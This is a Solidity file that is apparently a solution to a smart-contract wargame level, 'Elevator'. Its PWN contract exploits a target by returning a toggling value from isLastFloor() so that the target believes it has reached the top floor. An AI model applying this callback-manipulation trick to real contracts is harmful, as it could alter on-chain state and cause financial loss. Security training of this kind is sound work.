// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
  function top() external returns (bool);
  function floor() external returns (uint);
  function goTo(uint _floor) external;
}

contract PWN {
  IElevator public elev;
  bool public flag = false;

  constructor(address _instance) {
    elev = IElevator(_instance);
  }

  function pwn() external {
    elev.goTo(1);
  }

  function isLastFloor(uint) external returns (bool) {
    flag = !flag;
    return flag;
  }
}
